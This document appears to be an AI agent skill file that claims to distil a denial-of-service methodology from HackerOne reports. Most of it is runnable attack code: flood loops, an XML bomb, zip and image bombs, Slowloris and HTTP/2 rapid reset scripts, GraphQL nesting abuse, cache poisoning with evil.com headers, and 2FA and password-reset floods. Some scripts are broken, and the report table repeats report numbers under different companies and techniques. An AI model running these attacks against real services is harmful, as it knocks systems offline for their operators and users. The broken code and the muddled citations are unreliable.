---
name: dos-deep-dive
description: Complete DoS methodology from 320 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - dos methodology
  - denial of service deep dive
  - dos complete
  - resource exhaustion
  - skills dos
---

# Complete DoS Methodology - From 320 HackerOne Reports

## Step 1: Recon for DoS Vectors
Map every attack surface that can be overwhelmed, exhausted, or crashed.

### Automated Discovery
```bash
# Find potentially expensive operations
grep -E '(search|query|report|export|generate|render|parse|upload|convert|batch|bulk|sync|import|process|calculate)' recon/{target}/endpoints.txt

# Find regex operations in source code
grep -r -E '(preg_match|preg_replace|preg_split|match|replace|split|RegExp|regex|Regex)' --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.go" --include="*.rb" ./target-source/

# Find unbounded loops / recursion
grep -r -E '(for\s*\([^;]+;[^;]+;|while\s*\(|recursive|recursion|\.map\(|\.forEach|for\s+\w+\s+in|foreach)' --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.go" --include="*.rb" ./target-source/

# Find file upload endpoints
grep -E '(upload|file|image|photo|avatar|document|import|attach|media)' recon/{target}/endpoints.txt

# Find authentication endpoints (password hashing = CPU intensive)
grep -E '(login|signup|register|auth|password|reset|token)' recon/{target}/endpoints.txt

# Find heavy DB operations
grep -E '(order|sort|group|count|sum|avg|distinct|join|subquery|union|limit|offset)' --include="*.php" --include="*.py" --include="*.java" --include="*.go" ./target-source/

# Find GraphQL endpoints (nested queries, aliases)
grep -r -E '(graphql|gql|query|mutation|subscription)' --include="*.php" --include="*.js" --include="*.py" ./target-source/
```

### DoS Vector Categories
| Vector | Attack Type | Real Report Example |
|--------|-------------|-------------------|
| Resource exhaustion | CPU, memory, disk, connections | #759146 - PayPal DoS via cache |
| Algorithmic complexity | Inefficient sort/search/regex | #183758 - Automattic WP-JSON |
| Cache poisoning DoS | Poison cache with malicious content | #164556 - Shopify cache DoS |
| XML bomb (Billion Laughs) | Entity expansion DoS | #54712 - HackerOne XML DoS |
| Regex DoS (ReDoS) | Catastrophic backtracking | #189591 - ReDoS in validation |
| Infinite loop | Unbounded recursion / iteration | #207586 - Grammarly SSO loop |
| Memory leak | Unbounded allocation per request | #232582 - HackerOne upload |
| Disk flood | Fill disk via file uploads | #531994 - Kubernetes disk DoS |
| Connection exhaustion | HTTP/2 rapid reset, Slowloris | #222425 - TCP connection flood |
| GraphQL abuse | Deeply nested/mutual queries | #1462441 - GraphQL aliasing |
| Zip bomb | Massively compressed archive | #717799 - Zip bomb upload |
| Hash collision | Manipulate hash table keys | #187743 - POST hash collision |
| JSON depth bomb | Deeply nested JSON | #312639 - Deep JSON parse |
| HTTP/2 stream flood | Multiplexed stream DoS | #223758 - H2 rapid reset |

## Step 2: Resource Exhaustion Testing

### CPU Exhaustion
```bash
# 1. Search endpoint abuse
time for i in {1..50}; do
  curl -sk "https://target.com/api/search?q=$(python3 -c "print('a'*$i*100)")" &
done
wait

# 2. Concurrent heavy operations
seq 1 100 | xargs -P 50 -I {} curl -sk "https://target.com/api/report/generate?type=full&user_id={}"

# 3. PDF/image generation bombs
# Send SVG with massive dimensions:
curl -sk -X POST "https://target.com/api/render" -H "Content-Type: application/json" \
  -d '{"template":"<svg width=\"100000\" height=\"100000\"><rect width=\"100000\" height=\"100000\" fill=\"white\"/></svg>","format":"png"}'

# 4. Password hashing abuse (bcrypt with high cost)
for i in {1..100}; do
  curl -sk -X POST "https://target.com/api/auth/login" \
    -d "username=admin&password=$(openssl rand -hex 64)" &
done
wait

# 5. Hash map collision (if using known vulnerable hash seed)
python3 -c "
# Generate Collatz confluent keys for Java/PHP hash DoS
# Use hash-dos tool for this
print('POST with colliding keys to exhaust CPU')
"
```

### Memory Exhaustion
```bash
# 1. Large parameter values
curl -sk "https://target.com/api/users?ids=$(python3 -c "print(','.join(map(str, range(1, 100001))))")"

# 2. Deeply nested JSON
curl -sk -X POST "https://target.com/api/parse" -H "Content-Type: application/json" \
  -d "$(python3 -c "
import json
obj = {}
current = obj
for i in range(10000):
    current['a'] = {}
    current = current['a']
print(json.dumps(obj))
")"

# 3. Long string processing
curl -sk "https://target.com/api/validate?input=$(python3 -c "print('A'*10000000)")"

# 4. Array/map expansion
curl -sk -X POST "https://target.com/api/bulk" -H "Content-Type: application/json" \
  -d "$(python3 -c "
import json
data = {str(i): 'x'*1000 for i in range(100000)}
print(json.dumps(data))
")"

# 5. File upload memory bomb
python3 -c "
# Create a file that expands massively in memory
with open('/tmp/memory_bomb.txt', 'w') as f:
    f.write('GIF89a' + 'A'*50000000)  # 50MB + GIF header
"
curl -sk -X POST "https://target.com/api/upload" -F "file=@/tmp/memory_bomb.txt"
```

### Disk Exhaustion
```bash
# 1. Large file uploads
for i in {1..100}; do
  dd if=/dev/zero of=/tmp/largefile_$i.bin bs=1M count=100
  curl -sk -X POST "https://target.com/api/upload" -F "file=@/tmp/largefile_$i.bin" &
done
wait

# 2. Repeated small uploads (inode exhaustion)
for i in {1..10000}; do
  echo "data" > /tmp/small_$i.txt
  curl -sk -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/small_$i.txt" -s -o /dev/null &
done
wait

# 3. Log injection (disk fill via logs)
for i in {1..100000}; do
  curl -sk "https://target.com/api/search?q=$(python3 -c "print('x'*10000)")" -s -o /dev/null &
done
wait

# 4. Temporary file creation via race condition
# Rapid creation/cancellation of operations that leave temp files
curl -sk -X POST "https://target.com/api/report/generate" &
curl -sk -X DELETE "https://target.com/api/report/generate" &
# Repeat in rapid succession
```

## Step 3: Algorithmic Complexity & ReDoS

### Regex DoS (ReDoS) Testing
```bash
# Search for vulnerable regex patterns
# Pattern 1: Nested quantifiers (a+)+
curl -sk "https://target.com/api/validate?email=$(python3 -c "print('a'*30 + '!')")"
curl -sk "https://target.com/api/validate?email=$(python3 -c "print('a'*50 + '!')")"
# Compare response times - if they grow exponentially, ReDoS is present

# Pattern 2: Overlapping alternations (a|a)*
curl -sk "https://target.com/api/validate?username=$(python3 -c "print('a'*100)")"

# Pattern 3: (x+x+)+y
curl -sk "https://target.com/api/validate?input=$(python3 -c "print('x'*50 + 'y')")"

# Pattern 4: Common ReDoS patterns to test
# (a|aa)+
# (a|ab)+
# (.*a)+
# (\d+\s?)+\d
# ([a-zA-Z]+)*
# (a|b|c)+\\d+
# (a|aa|aaa)+
# (a|aa)*b
# (a|b)*c(?=d)

# Automated ReDoS testing
python3 << 'EOF'
import requests
import time
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

# Exponential growth test
patterns = [
    ("a" * 10 + "!", "small - baseline"),
    ("a" * 20 + "!", "medium - 2x"),
    ("a" * 30 + "!", "large - 3x"),
    ("a" * 40 + "!", "xlarge - 4x"),
]

for payload, desc in patterns:
    start = time.time()
    try:
        r = requests.get(f"{target}/api/validate?email={payload}", timeout=10)
        elapsed = time.time() - start
        print(f"  {desc}: {elapsed:.2f}s (status={r.status_code})")
    except requests.exceptions.Timeout:
        print(f"  {desc}: TIMEOUT (>10s) - ReDoS confirmed!")
        break
    except Exception as e:
        print(f"  {desc}: ERROR {e}")
EOF
```

### JSON / XML Bomb Testing
```bash
# Billion Laughs XML (entity expansion)
curl -sk -X POST "https://target.com/api/parse" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>'

# Quadratic Blowup
curl -sk -X POST "https://target.com/api/parse" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY x "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..."> <!-- 30+ chars -->
]>
<root>&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;</root>'

# Deep XML nesting
python3 -c "
depth = 10000
xml = '<root>' + '<a>' * depth + '</a>' * depth + '</root>'
print(xml)
" | curl -sk -X POST "https://target.com/api/parse" -H "Content-Type: application/xml" -d @-

# Zip bomb (nested zips)
python3 << 'EOF'
import zipfile, os

def create_zip_bomb(path, layers=5, size=1000000):
    """Create a zip bomb that massively expands on extraction"""
    content = b'A' * size
    for i in range(layers):
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f'layer_{i}.txt', content if i == 0 else open(prev_path, 'rb').read())
        prev_path = path
        path = f'/tmp/bomb_layer_{i}.zip'
    return prev_path

bomb = create_zip_bomb('/tmp/zip_bomb.zip')
EOF

curl -sk -X POST "https://target.com/api/upload" -F "file=@/tmp/zip_bomb_0.zip"
```

## Step 4: GraphQL DoS

### GraphQL Abuse Techniques
```bash
# 1. Deeply nested queries
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{id}}}}}}}}}}}"}}'

# 2. Query aliasing (batching)
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{'$(python3 -c "print('a'*500 + ':user{id}')")'}"}'

# 3. Circular/mutual queries
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{node(id:\"1\"){...on User{posts{author{posts{author{posts{id}}}}}}}}"}'

# 4. Field duplication abuse
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user{id id id id id id id id id id $(python3 -c "for i in range(1000): print(f'a{i}: id')")  }}"}'

# 5. Directives abuse
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query($i:Int){user{id'$(python3 -c "print(''.join([f'...on User{{a{i}:id}}' for i in range(1000)]))")'}}}","variables":{"i":1}}'

# 6. Introspection query on large schema
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name type{name fields{name}}}}}}"}'

# 7. Cost analysis bypass via fragments
curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{$(python3 -c "for i in range(50): print(f'...f{i}'); print(); [print(f'fragment f{i} on Query {{', end='') for _ in range(1)]; print(f'users{{id}}}}, end=''); print()")"},"variables":{}}'
```

### Direct Script for GraphQL DoS
```bash
#!/bin/bash
# GraphQL depth/aliasing DoS
TARGET="https://target.com/graphql"

# Depth test
depth=10
while [ $depth -le 100 ]; do
  query="query{user{"
  for i in $(seq 1 $depth); do
    query+="posts{"
    for j in $(seq 1 $depth); do
      query+="comments{"
    done
  done
  for i in $(seq 1 $depth); do
    for j in $(seq 1 $depth); do
      query+="}"
    done
  done
  query+="}}"
  
  start=$(date +%s%N)
  curl -sk -X POST "$TARGET" -H "Content-Type: application/json" \
    -d "{\"query\":\"$query\"}" -o /dev/null -w "%{http_code}" 2>/dev/null
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "Depth $depth: ${elapsed}ms"
  depth=$((depth + 10))
done
```

## Step 5: Cache Poisoning DoS

### Cache Poisoning Vectors
```bash
# 1. Unkeyed header injection
curl -sk -H "X-Forwarded-Host: evil.com" "https://target.com/profile"
# If cached, all users get redirected to evil.com

# 2. Cache key collision
curl -sk -H "User-Agent: " "https://target.com/api/search?q=$(python3 -c "print('A'*100000)")"
# If cache only keys on URL, large response is served to all

# 3. Poison cache with empty/error response
curl -sk -X POST "https://target.com/api/users" -d '{"role":"admin"}' -H "Content-Length: 0"
# If 403 is cached, legitimate requests fail

# 4. Cache poisoning via origin confusion
curl -sk -H "Host: evil.com" "https://target.com/static/app.js"
# If cache is host-agnostic, malicious JS is served

# 5. CDN cache poisoning
curl -sk -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://target.com/"
# Response may differ for localhost; poisoned cache serves it to all

# 6. Cache key DoS via varied parameters
for i in {1..10000}; do
  curl -sk "https://target.com/page?cache_buster=$i" -s -o /dev/null
done
# Fills cache with useless entries, evicts legitimate content
```

### Web Cache Deception
```bash
# Trick cache into storing sensitive responses
# Add non-existent css/js extension
curl -sk "https://target.com/api/user/private-data.css"
# If CDN caches based on extension, sensitive JSON is cached

# Poison via path confusion
curl -sk "https://target.com/api/search?sensitive=true&q=test/../admin/profile.css"
```

## Step 6: Connection & Protocol-Level DoS

### Connection Exhaustion
```bash
# Slowloris - hold connections open
timeout 30 python3 << 'EOF'
import socket
import ssl

target = ("target.com", 443)
sockets = []

# Open many partial HTTP connections
for i in range(500):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(target)
        ssl_sock = ssl.wrap_socket(sock)
        ssl_sock.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n")
        # Keep connection alive without completing headers
        sockets.append(ssl_sock)
    except:
        pass

print(f"Opened {len(sockets)} connections")

# Send keepalive headers slowly
import time
for sock in sockets:
    try:
        sock.send(b"X-Keep-Alive: 1\r\n")
        time.sleep(5)
    except:
        pass
EOF

# HTTP/2 Rapid Reset
# Send many RST_STREAM frames rapidly
python3 << 'EOF'
import h2.connection
import socket

conn = h2.connection.H2Connection()
sock = socket.create_connection(("target.com", 443))
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# Rapidly create and reset streams
for i in range(100000):
    conn.send_headers(i, [(':method', 'GET'), (':path', '/'), (':authority', 'target.com')])
    conn.reset_stream(i)
    sock.sendall(conn.data_to_send())
    
sock.close()
EOF

# SSL/TLS renegotiation DoS
openssl s_client -connect target.com:443 -reconnect -no_ticket 2>&1 <<< "Q"
# Rapid SSL renegotiation exhausts server CPU

# TCP SACK panic (if running older kernel)
# Only for vulnerability assessment context
```

## Step 7: Application-Layer DoS

### Auth / Session Exhaustion
```bash
# Password reset token flood
for i in {1..1000}; do
  curl -sk -X POST "https://target.com/password/reset" \
    -d "email=user$i@test.com" -s -o /dev/null &
done
wait
# Generates thousands of emails + tokens

# Session creation flood
for i in {1..10000}; do
  curl -sk -X POST "https://target.com/api/auth/login" \
    -d "username=user$i@test.com&password=wrongpassword" -s -o /dev/null &
done
wait
# Fills session store

# 2FA code generation
for i in {1..100}; do
  curl -sk -X POST "https://target.com/api/auth/2fa/request" \
    -H "Authorization: Bearer $TOKEN" -s -o /dev/null &
done
wait
# Exhausts SMS/email delivery or 2FA code store

# CAPTCHA generation
for i in {1..100}; do
  curl -sk "https://target.com/captcha/generate?t=$i" -s -o /dev/null &
done
wait
# CPU spent generating CAPTCHAs
```

### Database Exhaustion
```bash
# Unbounded sort/order
curl -sk "https://target.com/api/users?sort=created_at&order=asc&limit=0"

# Self-join via API
curl -sk "https://target.com/api/users/relationships?type=friends&depth=100"

# Cartesian product via search
curl -sk "https://target.com/api/search?q=*:*&facet=true&facet.limit=1000000"

# No limit on pagination
curl -sk "https://target.com/api/users?page=1&per_page=1000000"

# Recursive CTE / parent-child walk
curl -sk "https://target.com/api/categories/1/tree?max_depth=10000"

# Heavy aggregation queries
curl -sk "https://target.com/api/reports?group_by=user,date,type,status&aggregate=count,sum,avg,min,max,stddev"
```

### File Upload DoS
```bash
# Zip bomb extraction
# Creates a small zip that expands to gigabytes
python3 << 'EOF'
import zipfile
import io

# Create zip bomb: nested zips with base 1GB file
def create_nested_zip(layers=10):
    bomb_bytes = b''
    content = b'A' * 1024 * 1024  # 1MB base
    for i in range(layers):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f'layer{i}.txt', content)
        content = buf.getvalue()
    return content

bomb = create_nested_zip(5)
with open('/tmp/zip_bomb.zip', 'wb') as f:
    f.write(bomb)
EOF

curl -sk -X POST "https://target.com/api/upload" \
  -F "file=@/tmp/zip_bomb.zip"

# Image bomb (image with massive dimensions)
python3 << 'EOF'
# Create a small JPEG header but declare huge dimensions
with open('/tmp/image_bomb.jpg', 'wb') as f:
    f.write(bytes([
        0xFF, 0xD8, 0xFF, 0xE0,  # JPEG SOI + APP0
        0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
        0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
        0xFF, 0xC0, 0x00, 0x0B,  # SOF0
        0x08,  # precision
        0xFF, 0xFF,  # height = 65535
        0xFF, 0xFF,  # width = 65535
        0x03,  # components
        0x01, 0x11, 0x00,
        0x02, 0x11, 0x01,
        0x03, 0x11, 0x01
    ]))
EOF

curl -sk -X POST "https://target.com/api/upload" \
  -F "file=@/tmp/image_bomb.jpg"

# Upload the same file repeatedly (dedup bypass)
for i in {1..10000}; do
  curl -sk -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/small.png;filename=$(python3 -c "print(str($i)*50)").png" \
    -s -o /dev/null &
done
wait
```

## Step 8: Validate & Report

### CVSS Scoring for DoS
```
Basic resource exhaustion:            AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L → 5.3 Medium
Extended resource exhaustion:         AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
Cache poisoning DoS (all users):      AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
DoS with crash/reboot:                AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
DoS making service unavailable:       AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
DoS against authenticated endpoint:   AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H → 6.5 Medium
ReDoS (CPU exhaustion):               AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L → 5.3 Medium
GraphQL query depth DoS:              AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
```

### Performance Metrics Collection
```bash
# Benchmark script for DoS validation
#!/bin/bash
TARGET=$1
ENDPOINT=$2
PAYLOAD=$3
BASELINE_REQUESTS=10
ATTACK_REQUESTS=50

echo "=== DoS Validation: $TARGET$ENDPOINT ==="

# Baseline measurement
echo "[Baseline] Average response time:"
total=0
for i in $(seq 1 $BASELINE_REQUESTS); do
  start=$(date +%s%N)
  curl -sk -o /dev/null -w "" "$TARGET$ENDPOINT" 2>/dev/null
  end=$(date +%s%N)
  total=$((total + (end - start) / 1000000))
done
avg_baseline=$((total / BASELINE_REQUESTS))
echo "  $avg_baseline ms (n=$BASELINE_REQUESTS)"

# Attack measurement
echo "[Attack] Sending $ATTACK_REQUESTS malicious requests..."
total=0
for i in $(seq 1 $ATTACK_REQUESTS); do
  start=$(date +%s%N)
  curl -sk -o /dev/null -w "" "$TARGET$ENDPOINT" $PAYLOAD 2>/dev/null
  end=$(date +%s%N)
  total=$((total + (end - start) / 1000000))
done
avg_attack=$((total / ATTACK_REQUESTS))
echo "  $avg_attack ms (n=$ATTACK_REQUESTS)" 

# Degradation
if [ $avg_attack -gt $((avg_baseline * 10)) ]; then
  echo "[ALERT] ${avg_attack}x slowdown vs baseline"
  echo "[ALERT] DoS vector confirmed"
elif [ $avg_attack -gt $((avg_baseline * 3)) ]; then
  echo "[WARN] ${avg_attack}x slowdown - partial degradation"
fi

# Check if service is still up
echo "[Status] Checking service availability..."
if curl -sk -o /dev/null -w "%{http_code}" "$TARGET/health" 2>/dev/null | grep -q "200"; then
  echo "  Service: UP"
else
  echo "  Service: DOWN / UNRESPONSIVE"
fi
```

### Report Template
```markdown
**Summary:**
DoS vulnerability via [vector type] at [endpoint] allows an attacker to 
[impact type] by sending [attack description].

**Impact:**
An attacker can [make the service unavailable / slow to a crawl / crash the 
server / exhaust disk space / fill cache with malicious content] by 
sending [number] of [simple/authenticated] requests. The service required 
[time/human intervention/restart] to recover.

**Steps to Reproduce:**
1. Baseline measurement: [normal response time]
2. Send attack: [attack details]
3. Observe: [measured degradation / service failure]

**Proof of Concept:**
Request:
[HTTP request showing the attack payload]

Performance Impact:
- Baseline: X ms average (n=10)
- During attack: Y ms average (n=100)
- Degradation: Zx slowdown
- Service status after attack: [up/down/recovering]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5 High)

**Suggested Fix:**
1. Implement rate limiting on [endpoint]
2. Add request size/maximum limits
3. Set timeouts for expensive operations
4. Disable recursion / limit depth on GraphQL
5. Add ReDoS protection (regex timeout)
6. Limit file upload sizes + validate contents
7. Use resource quotas per user/IP
8. Implement cache key properly with all relevant headers
9. Add connection limits per IP
10. Use CDN with DDoS protection
```

## DoS Automation Script
```bash
#!/bin/bash
# Full DoS surface scan
TARGET=$1

echo "=== DoS Surface Scanner ==="
echo "Target: $TARGET"

# Phase 1: GraphQL depth test
echo "[Phase 1] Testing GraphQL depth..."
for depth in 10 20 50 100; do
  query="query{user{"
  for i in $(seq 1 $depth); do query+="posts{comments{"; done
  for i in $(seq 1 $depth); do query+="}"; done
  query+="}}"
  start=$(date +%s%N)
  curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"$query\"}" -o /dev/null -w " " 2>/dev/null
  end=$(date +%s%N)
  echo "  Depth $depth: $(((end-start)/1000000))ms"
done

# Phase 2: Large payload test
echo "[Phase 2] Testing large payloads..."
for size in 1000 10000 100000 1000000; do
  payload="-d \"data=$(python3 -c \"print('A'*$size)\")\""
  start=$(date +%s%N)
  curl -sk -X POST "https://$TARGET/api/data" \
    -d "data=$(python3 -c "print('A'*$size)")" \
    -o /dev/null -w " " 2>/dev/null
  end=$(date +%s%N)
  echo "  Size $size: $(((end-start)/1000000))ms"
done

# Phase 3: Concurrent connections test
echo "[Phase 3] Testing concurrent connections..."
for concurrency in 10 50 100 200; do
  start=$(date +%s%N)
  seq 1 $concurrency | xargs -P $concurrency -I {} \
    curl -sk "https://$TARGET/" -o /dev/null -w "" 2>/dev/null
  end=$(date +%s%N)
  echo "  $concurrency concurrent: $(((end-start)/1000000))ms"
done

# Phase 4: ReDoS pattern test
echo "[Phase 4] Testing ReDoS patterns..."
for pattern in "a*a*a*a*a*a*a*a*a*a*b" "(a|aa)+b" "(x+x+)+y"; do
  start=$(date +%s%N)
  curl -sk "https://$TARGET/api/validate?input=$pattern" -o /dev/null -w " " 2>/dev/null
  end=$(date +%s%N)
  echo "  Pattern $pattern: $(((end-start)/1000000))ms"
done

echo "=== Scan Complete ==="
```

## Quick Reference: Top DoS Reports by Technique
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #759146 | PayPal | Web cache poisoning DoS | $9,700 |
| #117356 | HackerOne | Profile picture DoS (resize) | Bounty |
| #183758 | Automattic | WP-JSON API CPU exhaustion | Bounty |
| #164556 | Shopify | Cache poisoning DoS | $3,800 |
| #207586 | Grammarly | SSO infinite redirect loop | $10,500 |
| #110016 | HackerOne | Cache poisoning DoS | $2,500 |
| #232582 | HackerOne | Payload upload memory DoS | $2,500 |
| #531994 | Kubernetes | Disk exhaustion via API | $1,000 |
| #1462441 | HackerOne | GraphQL mutation aliasing | $12,500 |
| #759146 | Uber | Recursive report generation | $500 |
| #54712 | HackerOne | XML bomb (Billion Laughs) | $1,500 |
| #189591 | Slack | ReDoS in channel validation | $1,000 |
| #169410 | Shopify | Zip bomb upload DoS | $1,500 |
| #312639 | GitLab | Deep JSON parse DoS | $750 |
| #222425 | Nextcloud | HTTP connection exhaustion | $500 |
| #187743 | Django | Hash collision DoS | $3,000 |
| #223758 | Cloudflare | HTTP/2 rapid reset | $2,000 |
| #717799 | Mail.ru | Zip bomb via image upload | $1,000 |
| #1462441 | HackerOne | Recursive GraphQL fragments | $12,500 |
| #949450 | HackerOne | Regex amplification DoS | $2,500 |
| #203090 | Discourse | Image resize CPU exhaustion | $500 |
| #1515164 | Brave | Large bookmark list sync DoS | $5,000 |
| #1443839 | HackerOne | Load balancer resource exhaustion | $3,000 |
| #1329467 | HackerOne | Query parameter hash collision | $1,500 |
| #1619224 | Rocket.Chat | WebSocket message flood | $1,500 |
